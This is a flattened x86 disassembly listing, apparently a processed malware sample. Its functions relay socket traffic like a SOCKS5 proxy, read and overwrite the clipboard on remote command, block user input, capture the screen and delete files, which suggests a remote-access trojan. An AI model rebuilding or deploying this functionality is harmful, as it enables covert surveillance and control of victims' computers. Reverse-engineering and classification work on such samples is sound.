push esi
push ebx
lea eax [ ebp - 0x6c ]
push eax
call edi
test eax eax
je r-xdata
lea eax [ ebp + 0x3a4 ]
push eax
lea eax [ ebp + 0x19c ]
push eax
call sub_100084f0
lea ecx [ ebp + 0x3a4 ]
push ecx
lea ecx [ ebp + 0x19c ]
push ecx
call sub_1001265d
add esp 0x10
cmp eax esi
je r-xdata
lea eax [ ebp + 0x3a4 ]
push eax
push [ ebp - 0x70 ]
call sub_1000b34d
push [ ebp - 0x70 ]
call sub_1001265d
add esp 0xc
lea eax [ ebp + 0x19c ]
push eax
call [ DeleteFileW@IAT ]
xor eax eax
inc eax
jmp r-xdata
mov esi [ DeleteFileW@IAT ]
mov eax ecx
push eax
call esi
lea eax [ ebp + 0x3a4 ]
push eax
call esi
call sub_1001265d
mov ecx [ ebp + 0x5ac ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
add ebp 0x5b0
leave
retn
sub_10008803
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
push 0x20
push esi
call sub_1000d1ab
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
inc esi
mov eax ebx
xor edx edx
mov ecx esi
sub eax esi
push edi
xor eax eax
pop edi
test edx edx
je r-xdata
cmp di 0x20
je r-xdata
mov [ ebx + edx * 2 ] ax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ eax + ecx ] di
inc edx
inc ecx
inc ecx
cmp edx 0x104
jl r-xdata
lea eax [ esi + edx * 2 ]
jmp r-xdata
add eax 0x2
jmp r-xdata
movzx edi [ ecx ]
test di di
je r-xdata
lea ecx [ ebx + edx * 2 - 0x2 ]
cmp [ ecx ] 0x20
je r-xdata
test edx edx
jle r-xdata
xor esi esi
mov [ ecx ] si
dec edx
sub_1000887e
push ebp
mov ebp esp
push ecx
push ecx
cmp [ eax + 0xc ] 0x4
je r-xdata
leave
retn
mov cx [ eax + 0x10 ]
mov eax [ eax ]
mov [ ebp - 0x7 ] cx
mov ecx 0xffff
mov [ ebp - 0x5 ] cx
push 0x5
lea ecx [ ebp - 0x8 ]
push ecx
mov [ ebp - 0x8 ] 0x8b
call sub_10008d81
sub_100088ad
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi eax
mov al [ esi + 0x4 ]
cmp al 0xb0
jae r-xdata
cmp [ esi + 0x5 ] 0x1
jne r-xdata
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push edi
push [ esi + 0x14 ]
call sub_10006dde
pop ecx
pop ecx
movzx eax [ esi + 0x1c ]
push eax
push [ esi + 0x18 ]
push [ ebp + 0x8 ]
push [ esi + 0x20 ]
call sub_10006f6a
add esp 0x10
jmp r-xdata
cmp al 0x1
jne r-xdata
cmp [ edi ] 0x5
jne r-xdata
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
cmp al 0x2
jne r-xdata
mov al [ edi ]
cmp al 0x1
jne r-xdata
mov [ esi + 0x4 ] 0xff
movsx eax [ edi + 0x1 ]
inc eax
inc eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ edi ] 0x5
jmp r-xdata
cmp al 0x5
mov [ esi + 0x4 ] 0x2
jmp r-xdata
mov [ esi + 0x4 ] 0x1
jmp r-xdata
jne r-xdata
cmp [ edi + 0x1 ] 0x3
jne r-xdata
cmp [ edi + 0x2 ] 0x0
jne r-xdata
mov al [ edi + 0x3 ]
push 0xa
pop ecx
cmp al 0x1
jne r-xdata
cmp al 0x3
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
movsx eax [ edi + 0x4 ]
add eax 0x7
cmp [ ebp + 0x8 ] eax
jne r-xdata
lea eax [ edi + 0x8 ]
mov [ esi + 0x4 ] 0xc1
push eax
lea ebx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ edi + 0x3 ] 0x1
call sub_100070a2
mov [ esi + 0x20 ] eax
pop ecx
test eax eax
jne r-xdata
call sub_10008d58
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000899b
push ebx
push esi
mov esi eax
push edi
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
push 0xc
call sub_1000b786
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0xc
push 0x0
push edi
call sub_1000b660
add esp 0xc
cmp [ esi ] 0x0
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov [ eax + 0x4 ] edi
mov eax [ esi + 0x8 ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] edi
inc [ esi ]
mov [ esi + 0x8 ] edi
mov esi [ esi ]
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
push ebx
call [ LeaveCriticalSection@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
sub_10008a07
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push edi
lea edi [ esi + 0xc ]
push edi
call [ EnterCriticalSection@IAT ]
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
xor edx edx
test ecx ecx
jle r-xdata
push edi
call [ LeaveCriticalSection@IAT ]
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x4
push ebx
test ecx ecx
je r-xdata
mov eax [ eax + 0x4 ]
inc edx
cmp edx ecx
jl r-xdata
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ esi + 0x4 ]
cmp eax ecx
jne r-xdata
mov ebx [ eax + 0x8 ]
mov bx [ ebx + 0x10 ]
cmp bx [ ebp + 0x8 ]
je r-xdata
jmp r-xdata
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
jmp r-xdata
pop ebx
push eax
call sub_1000b6da
dec [ esi ]
pop ecx
mov ecx [ ecx ]
mov [ esi + 0x8 ] ecx
sub_10008a8b
mov eax [ esi ]
test eax eax
je r-xdata
retn
push ebx
xor ebx ebx
test eax eax
jle r-xdata
and [ esi ] 0x0
pop ebx
push edi
mov eax [ esi + 0x4 ]
mov edi [ eax + 0x4 ]
push eax
call sub_1000b6da
inc ebx
mov [ esi + 0x4 ] edi
cmp ebx [ esi ]
pop ecx
jl r-xdata
pop edi
sub_10008ab4
push ebp
lea ebp [ esp - 0x74 ]
sub esp 0xbc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x70 ] eax
push esi
mov esi [ InitializeCriticalSection@IAT ]
push edi
xor edi edi
lea eax [ ebp + 0x24 ]
push eax
mov [ ebp + 0x18 ] edi
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x20 ] edi
call esi
mov eax [ ebp + 0x7c ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x28 ] edi
call esi
lea ecx [ ebp - 0x44 ]
call sub_1000907e
test eax eax
je r-xdata
lea esi [ ebp - 0x44 ]
call sub_100090ea
mov esi [ DeleteCriticalSection@IAT ]
lea eax [ ebp - 0x40 ]
push eax
call esi
lea eax [ ebp + 0x24 ]
push eax
call esi
lea esi [ ebp + 0x18 ]
call sub_10008a8b
mov ecx [ ebp + 0x70 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1000ac69
add ebp 0x74
leave
retn
lea eax [ ebp - 0x48 ]
push eax
push edi
lea eax [ ebp - 0x44 ]
push eax
push sub_10008db9
push edi
push edi
mov [ ebp + 0x10 ] edi
call sub_1000bea9
add esp 0x18
cmp eax edi
je r-xdata
push 0xffffffff
push eax
mov [ ebp - 0x28 ] eax
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x28 ]
call [ CloseHandle@IAT ]
sub_10008b66
push ebp
lea ebp [ esp - 0x798 ]
sub esp 0x818
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x794 ] eax
push ebx
push esi
mov esi [ ebp + 0x7a0 ]
cmp [ esi + 0xc ] 0x0
mov ax [ esi + 0x10 ]
mov ebx [ esi + 0x20 ]
mov [ ebp - 0x6b ] ax
mov [ ebp - 0x6c ] 0x8b
mov [ ebp - 0x80 ] 0x10
jne r-xdata
mov ecx [ ebp + 0x794 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1000ac69
add ebp 0x798
leave
retn 0x4
push edi
pop edi
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x7c ]
push eax
push 0x0
push 0x7fb
lea eax [ ebp - 0x67 ]
push eax
push ebx
call [ recvfrom@IAT ]
mov edi eax
test edi edi
jle r-xdata
cmp [ esi + 0x5 ] 0x0
jne r-xdata
push [ ebp - 0x7a ]
call [ ntohs@IAT ]
mov ecx [ ebp - 0x78 ]
movzx eax ax
mov [ ebp - 0x69 ] di
mov [ esi + 0x1c ] ax
add edi 0x5
push edi
lea eax [ ebp - 0x6c ]
push eax
mov eax [ esi ]
mov [ esi + 0x18 ] ecx
call sub_10008d81
test eax eax
je r-xdata
mov [ esi + 0x5 ] 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax 0xffffffff
mov ecx ebx
call sub_10006d56
test eax eax
jle r-xdata
sub_10008c2f
push ebp
lea ebp [ esp - 0x53c ]
sub esp 0x5bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x538 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x544 ]
mov eax [ edi ]
mov ebx [ edi + 0x14 ]
mov [ ebp - 0x80 ] eax
mov ax [ edi + 0x10 ]
mov [ ebp - 0x7b ] ax
mov [ ebp - 0x7c ] 0x8b
jmp r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
mov eax 0xffffffff
mov ecx ebx
call sub_10006d56
test eax eax
jle r-xdata
mov esi [ closesocket@IAT ]
push ebx
call esi
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
push 0x0
push 0x5af
lea eax [ ebp - 0x77 ]
push eax
push ebx
call [ recv@IAT ]
mov esi eax
test esi esi
jle r-xdata
mov eax edi
call sub_1000887e
mov esi [ ebp - 0x80 ]
push [ ebp - 0x7b ]
add esi 0x5c
call sub_10008a07
push edi
call sub_1000b6da
pop ecx
mov ecx [ ebp + 0x538 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1000ac69
add ebp 0x53c
leave
retn 0x4
push eax
call esi
push 0xffffffff
push [ edi + 0x8 ]
call [ WaitForSingleObject@IAT ]
push [ edi + 0x8 ]
call [ CloseHandle@IAT ]
cmp [ edi + 0x5 ] 0x1
je r-xdata
cmp [ edi + 0x4 ] 0xc1
jne r-xdata
mov [ ebp - 0x79 ] si
add esi 0x5
push esi
lea eax [ ebp - 0x7c ]
push eax
mov eax [ edi ]
call sub_10008d81
test eax eax
je r-xdata
cmp [ ebp - 0x77 ] 0x5
jne r-xdata
mov [ edi + 0x4 ] 0xff
cmp [ ebp - 0x76 ] 0x0
jne r-xdata
cmp [ ebp - 0x75 ] 0x0
jne r-xdata
cmp [ ebp - 0x74 ] 0x1
jne r-xdata
cmp esi 0xa
jne r-xdata
mov eax [ ebp - 0x73 ]
push [ ebp - 0x6f ]
mov [ edi + 0x18 ] eax
call [ ntohs@IAT ]
mov [ edi + 0x1c ] ax
mov [ edi + 0x5 ] 0x1
sub_10008d58
push ecx
lea eax [ esp ]
push eax
push 0x0
push esi
push sub_10008b66
push 0x0
push 0x0
call sub_1000bea9
add esp 0x18
test eax eax
je r-xdata
xor eax eax
pop ecx
retn
mov [ esi + 0x8 ] eax
xor eax eax
inc eax
pop ecx
retn
sub_10008d81
push esi
push edi
mov esi eax
lea edi [ esi + 0x4 ]
push edi
call [ EnterCriticalSection@IAT ]
push [ esp + 0xc ]
mov eax [ esp + 0x14 ]
push [ esi ]
call sub_10006dde
mov esi eax
sub esi [ esp + 0x18 ]
pop ecx
neg esi
pop ecx
sbb esi esi
push edi
inc esi
call [ LeaveCriticalSection@IAT ]
pop edi
mov eax esi
pop esi
retn 0x8
sub_10008db9
push ebp
lea ebp [ esp - 0xff9c ]
mov eax 0x1001c
call sub_1001ac50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xff98 ] eax
push ebx
push esi
mov esi [ ebp + 0xffa4 ]
push edi
mov edi [ esi ]
push 0x1388
push 0x13880
push edi
mov [ ebp - 0x7c ] edi
call sub_10006eea
push 0xffffffff
lea eax [ ebp - 0x70 ]
push eax
push edi
push 0x5
pop edi
call sub_10006d97
add esp 0x18
jmp r-xdata
test eax eax
jne r-xdata
cmp [ ebp - 0x70 ] 0x8b
jne r-xdata
mov [ esi + 0x54 ] 0x1
push r--data
mov [ esi + 0x54 ] 0x2
push r--data
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x6d ] bx
je r-xdata
add esi 0x20
push esi
call sub_1000bcb0
pop ecx
pop ecx
mov ecx [ ebp + 0xff98 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1000ac69
add ebp 0xff9c
leave
retn 0x4
movzx eax [ ebp - 0x6f ]
mov [ ebp - 0x78 ] eax
lea edi [ esi + 0x5c ]
lea eax [ edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
and [ ebp - 0x74 ] 0x0
cmp [ edi ] 0x0
mov eax [ edi + 0x4 ]
jle r-xdata
mov eax 0xffff
cmp [ ebp - 0x6d ] ax
je r-xdata
lea eax [ edi + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x8 ]
mov dx [ ebp - 0x78 ]
cmp [ ecx + 0x10 ] dx
je r-xdata
movzx edi [ ebp - 0x6d ]
push 0xffffffff
lea eax [ ebp - 0x68 ]
push eax
push [ ebp - 0x7c ]
call sub_10006d97
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x6d ] 0x0
jne r-xdata
mov edi 0xffff
mov eax edi
cmp [ ebp - 0x6d ] ax
jne r-xdata
mov ebx ecx
inc [ ebp - 0x74 ]
mov ecx [ ebp - 0x74 ]
cmp ecx [ edi ]
mov eax [ eax + 0x4 ]
jl r-xdata
push 0xffffffff
lea eax [ ebp - 0x70 ]
push eax
push [ ebp - 0x7c ]
push 0x5
pop edi
call sub_10006d97
add esp 0xc
movzx eax [ esi + 0xb2 ]
push eax
lea ebx [ esi + 0x80 ]
call sub_10006ca3
xor ebx ebx
pop ecx
mov [ ebp - 0x78 ] eax
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
push 0x2
push [ ebx + 0x14 ]
mov [ ebx + 0xc ] 0x1
call shutdown
jmp r-xdata
push 0x24
call sub_1000b786
pop ecx
cmp eax ebx
je r-xdata
lea eax [ esi + 0x20 ]
push r--data
push eax
mov [ esi + 0x54 ] 0x4
call sub_1000bcb0
pop ecx
pop ecx
mov eax 0xffff
mov [ ebp - 0x6d ] ax
push 0x5
lea eax [ ebp - 0x70 ]
push eax
mov eax esi
call sub_10008d81
jmp r-xdata
cmp [ ebp - 0x6d ] di
je r-xdata
mov [ ebp - 0x74 ] ebx
movzx ecx [ ebp - 0x6f ]
mov [ eax + 0x10 ] cx
mov ecx [ ebp - 0x78 ]
mov [ eax + 0x5 ] bl
mov [ eax + 0x4 ] bl
mov [ eax + 0x14 ] ecx
mov [ eax + 0x20 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax ] esi
mov [ eax + 0x8 ] ebx
mov [ ebp - 0x74 ] eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x80 ]
push eax
push ebx
push [ ebp - 0x74 ]
push sub_10008c2f
push ebx
push ebx
call sub_1000bea9
add esp 0x18
cmp eax ebx
je r-xdata
lea eax [ esi + 0x20 ]
push r--data
push eax
mov [ esi + 0x54 ] 0x4
call sub_1000bcb0
pop ecx
pop ecx
mov eax 0xffff
mov [ ebp - 0x6d ] ax
push 0x5
lea eax [ ebp - 0x70 ]
push eax
mov eax esi
call sub_10008d81
push [ ebp - 0x78 ]
call [ closesocket@IAT ]
jmp r-xdata
cmp [ ebp - 0x74 ] ebx
jne r-xdata
movzx eax [ ebp - 0x6d ]
push eax
lea eax [ ebp - 0x68 ]
mov ecx ebx
call sub_100088ad
test eax eax
jne r-xdata
mov eax [ ebp - 0x74 ]
call sub_1000887e
push [ ebp - 0x74 ]
call sub_1000b6da
pop ecx
push eax
call [ CloseHandle@IAT ]
push [ ebp - 0x74 ]
mov eax edi
call sub_1000899b
jmp r-xdata
lea eax [ esi + 0x20 ]
push r--data
push eax
mov [ esi + 0x54 ] 0x4
call sub_1000bcb0
pop ecx
pop ecx
push 0x2
push [ ebx + 0x14 ]
mov [ ebx + 0xc ] 0x1
call shutdown
jmp r-xdata
sub_1000907e
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
push 0xffffffff
lea eax [ ebp - 0x38 ]
push eax
mov esi ecx
push [ esi ]
push 0x34
pop edi
call sub_10006d97
add esp 0xc
test eax eax
jne r-xdata
push edi
lea eax [ ebp - 0x38 ]
push eax
sub esi 0xffffff80
push esi
mov [ ebp - 0x7 ] 0x0
call sub_1000ac80
xor eax eax
add esp 0xc
inc eax
mov [ esi + 0x54 ] 0x1
push r--data
add esi 0x20
push esi
call sub_1000bcb0
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
sub_100090ea
push ebp
mov ebp esp
push ecx
push ebx
push edi
lea ebx [ esi + 0x68 ]
push ebx
call [ EnterCriticalSection@IAT ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x5c ] 0x0
mov edi [ esi + 0x60 ]
jle r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
pop edi
pop ebx
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ eax + 0xc ] 0x4
mov eax [ edi + 0x8 ]
push 0x2
push [ eax + 0x14 ]
call shutdown
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x5c ]
mov edi [ edi + 0x4 ]
jl r-xdata
cmp [ esi + 0x5c ] 0x0
jg r-xdata
push 0xa
call [ Sleep@IAT ]
push [ esi ]
call [ closesocket@IAT ]
xor eax eax
leave
retn
sub_10009151
push ebp
mov ebp esp
sub esp 0x40
push esi
push edi
mov [ ebx ] r--data
mov [ ebp - 0x40 ] 0x7f8a
mov [ ebp - 0x3c ] 0x7f00
mov [ ebp - 0x38 ] 0x7f03
mov [ ebp - 0x34 ] 0x7f89
mov [ ebp - 0x30 ] 0x7f8b
mov [ ebp - 0x2c ] 0x7f01
mov [ ebp - 0x28 ] 0x7f81
mov [ ebp - 0x24 ] 0x7f88
mov [ ebp - 0x20 ] 0x7f80
mov [ ebp - 0x1c ] 0x7f86
mov [ ebp - 0x18 ] 0x7f83
mov [ ebp - 0x14 ] 0x7f85
mov [ ebp - 0x10 ] 0x7f82
mov [ ebp - 0xc ] 0x7f84
mov [ ebp - 0x8 ] 0x7f04
mov [ ebp - 0x4 ] 0x7f02
xor edi edi
lea esi [ ebx + 0x44 ]
mov eax [ ebp + edi * 4 - 0x40 ]
push eax
push 0x0
mov [ esi - 0x40 ] eax
call [ LoadCursorW@IAT ]
mov [ esi ] eax
inc edi
add esi 0x4
cmp edi 0x10
jl r-xdata
pop edi
mov eax ebx
pop esi
leave
retn
sub_100091f5
push esi
push edi
push 0x10
mov [ ecx ] r--data
lea esi [ ecx + 0x44 ]
pop edi
push [ esi ]
call [ DestroyCursor@IAT ]
add esi 0x4
dec edi
jne r-xdata
pop edi
pop esi
retn
sub_10009230
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10020eec
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x2014
call sub_1001ac50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2010 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2028 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x8 ]
call sub_1001265d
add esp 0x4
push 0xa8
call sub_1000b786
pop ecx
mov [ esp + 0x18 ] eax
and [ esp + 0x2030 ] 0x0
test eax eax
je r-xdata
and [ esp + 0x14 ] 0x0
mov ebx [ esp + 0x14 ]
push [ ebp + 0x8 ]
push eax
call sub_100094eb
mov ebx eax
mov [ esp + 0x14 ] ebx
jmp r-xdata
push [ ebp + 0x8 ]
call [ closesocket@IAT ]
cmp ebx esi
je r-xdata
movzx eax [ esp + 0x1c ]
cmp eax 0x16
jg r-xdata
or [ esp + 0x2030 ] 0xffffffff
call sub_1001265d
mov ecx [ esp + 0x2028 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x2010 ]
xor ecx esp
call sub_1000ac69
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
push 0x1
mov ecx ebx
call [ eax ]
sub eax 0x17
je r-xdata
je r-xdata
cmp [ esp + 0x1d ] 0x0
setne al
mov [ ebx + 0x11 ] al
push eax
push [ ebx + 0xa4 ]
call sub_1000a260
jmp r-xdata
dec eax
je r-xdata
cmp [ esp + 0x1d ] 0x0
setne al
mov [ ebx + 0xa ] al
jmp r-xdata
sub eax 0x11
je r-xdata
push [ ebp + 0x8 ]
call sub_10006e38
pop ecx
xor esi esi
push esi
push 0x1ffe
lea eax [ esp + 0x24 ]
push eax
push [ ebp + 0x8 ]
call [ recv@IAT ]
mov edi eax
cmp edi esi
jle r-xdata
push esi
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
movzx edi [ esp + 0x1d ]
mov esi ebx
call sub_1000961f
jmp r-xdata
dec eax
je r-xdata
push 0x1
call [ GetClipboardData@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push esi
dec edi
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
sub eax 0x5
jne r-xdata
mov al [ esp + 0x1d ]
mov [ ebx + 0x10 ] al
movzx eax al
push eax
mov eax [ ebx + 0xa4 ]
add eax 0x4
push eax
call [ InterlockedExchange@IAT ]
jmp r-xdata
dec eax
je r-xdata
push ebx
call [ GlobalSize@IAT ]
mov edi eax
push ebx
inc edi
call [ GlobalLock@IAT ]
push edi
mov [ esp + 0x1c ] eax
call sub_1000ac5e
pop ecx
dec edi
mov esi eax
push edi
push [ esp + 0x1c ]
lea eax [ esi + 0x1 ]
push eax
mov [ esi ] 0x76
call sub_1000ac80
add esp 0xc
push ebx
call [ GlobalUnlock@IAT ]
call [ CloseClipboard@IAT ]
push esi
call sub_1000d1a0
pop ecx
call [ CloseClipboard@IAT ]
jmp r-xdata
call [ EmptyClipboard@IAT ]
push edi
push 0x2000
call [ GlobalAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebx + 0xc ]
call [ SetEvent@IAT ]
jmp r-xdata
call sub_100080cd
jmp r-xdata
dec eax
je r-xdata
mov ebx [ esp + 0x14 ]
jmp r-xdata
call [ CloseClipboard@IAT ]
jmp r-xdata
push esi
call [ GlobalLock@IAT ]
push edi
lea ecx [ esp + 0x21 ]
push ecx
push eax
call sub_1000ac80
add esp 0xc
push esi
call [ GlobalUnlock@IAT ]
push esi
push 0x1
call [ SetClipboardData@IAT ]
push esi
call [ GlobalFree@IAT ]
push esi
mov esi [ BlockInput@IAT ]
call esi
lea ecx [ edi - 0x1 ]
push 0x1c
xor edx edx
mov eax ecx
pop edi
div edi
test edx edx
jne r-xdata
dec eax
jne r-xdata
movzx eax [ ebx + 0x9 ]
push eax
call esi
jmp r-xdata
push ecx
lea eax [ esp + 0x21 ]
push eax
call sub_10009a54
cmp [ esp + 0x1d ] al
setne al
mov [ ebx + 0x9 ] al
jmp r-xdata
sub_100094eb
push 0x4
mov eax sub_10020ec4
call sub_1001ce0c
mov esi [ ebp + 0x8 ]
lea ebx [ esi + 0x20 ]
mov [ esi ] r--data
call sub_10009151
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x110
mov [ esi + 0x10 ] 0x1
mov [ esi + 0x14 ] 0x8
call sub_1000b786
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor eax eax
push ebx
push eax
push 0x8
pop ecx
call sub_10009c19
jmp r-xdata
push ebx
push ebx
mov [ esi + 0xa4 ] eax
mov eax [ ebp + 0xc ]
push 0x1
push ebx
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xa ] bl
mov [ esi + 0x9 ] bl
mov [ esi + 0x11 ] bl
mov [ esi + 0x4 ] eax
call [ CreateEventW@IAT ]
mov [ esi + 0xc ] eax
push esi
mov eax sub_100098ec
call sub_10007ee9
mov [ esi + 0x18 ] eax
push esi
mov eax sub_10009998
call sub_10007ee9
pop ecx
mov [ esi + 0x1c ] eax
pop ecx
mov eax esi
call sub_1001ce75
retn 0x8
sub_100095a7
push 0x4
mov eax sub_10020e40
call sub_1001ce0c
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov edi [ InterlockedExchange@IAT ]
push 0x0
lea eax [ esi + 0xa ]
push eax
call edi
push 0x0
lea eax [ esi + 0x8 ]
push eax
call edi
mov edi [ WaitForSingleObject@IAT ]
push 0xffffffff
push [ esi + 0x18 ]
call edi
push 0xffffffff
push [ esi + 0x1c ]
call edi
push [ esi + 0x18 ]
mov edi [ CloseHandle@IAT ]
call edi
push [ esi + 0x1c ]
call edi
push [ esi + 0xc ]
call edi
mov ecx [ esi + 0xa4 ]
test ecx ecx
je r-xdata
lea ecx [ esi + 0x20 ]
call sub_100091f5
call sub_1001ce75
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000961f
push 0x4
mov eax sub_10020e94
call sub_1001ce0c
push 0xffffffff
push [ esi + 0x18 ]
mov [ esi + 0x8 ] 0x0
call [ WaitForSingleObject@IAT ]
push [ esi + 0x18 ]
call [ CloseHandle@IAT ]
mov ecx [ esi + 0xa4 ]
test ecx ecx
je r-xdata
push 0x110
call sub_1000b786
pop ecx
mov [ ebp - 0x10 ] eax
cmp edi 0x3
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp edi 0x7
jne r-xdata
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
je r-xdata
xor eax eax
push 0x1
push eax
push 0x4
push 0x0
push eax
mov ecx edi
push ecx
push eax
push 0x8
jmp r-xdata
call sub_10009c19
jmp r-xdata
mov [ esi + 0xa4 ] eax
movzx eax [ esi + 0x10 ]
push eax
mov eax [ esi + 0xa4 ]
add eax 0x4
push eax
call [ InterlockedExchange@IAT ]
movzx eax [ esi + 0x11 ]
push eax
push [ esi + 0xa4 ]
call sub_1000a260
push esi
mov eax sub_100098ec
mov [ esi + 0x14 ] edi
mov [ esi + 0x8 ] 0x1
call sub_10007ee9
pop ecx
mov [ esi + 0x18 ] eax
call sub_1001ce75
retn
pop ecx
jmp r-xdata
sub_100096eb
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ esi + 0xa4 ]
mov ecx [ eax + 0x70 ]
xor eax eax
cmp ecx 0x8
push edi
jg r-xdata
push 0x4
lea eax [ eax * 4 + 0x2d ]
push 0x1000
push eax
push 0x0
mov [ ebp - 0x4 ] eax
call [ VirtualAlloc@IAT ]
mov edi eax
push 0x4
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov [ edi ] 0x73
call sub_1000ac80
mov eax [ ebp - 0x4 ]
dec eax
push eax
mov eax [ esi + 0xa4 ]
push [ eax + 0x68 ]
lea eax [ edi + 0x5 ]
push eax
call sub_1000ac80
mov eax [ ebp - 0x4 ]
add esp 0x18
push edi
call sub_10009870
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
pop edi
pop esi
leave
retn
inc eax
shl eax cl
sub_10009769
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi eax
mov edi [ esi + 0xa4 ]
push [ edi + 0x10 ]
xor ebx ebx
push ebx
push ebx
push [ edi + 0x44 ]
push [ edi + 0x2c ]
push [ edi + 0x28 ]
push ebx
push ebx
push [ edi + 0x4c ]
call [ BitBlt@IAT ]
mov edi [ edi + 0x60 ]
cmp edi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xa4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x14 ]
add eax 0x5
push eax
mov [ ebp - 0x4 ] eax
call sub_1000ac5e
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
push 0x4
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebx + 0x1 ]
push eax
mov [ ebx ] 0x74
call sub_1000ac80
mov eax [ ebp - 0x4 ]
add eax 0xfffffffb
push eax
lea eax [ ebx + 0x5 ]
push edi
push eax
call sub_1000ac80
mov eax [ ebp - 0x4 ]
add esp 0x18
push ebx
call sub_10009870
push ebx
call sub_1000d1a0
pop ecx
sub_100097f4
push ebp
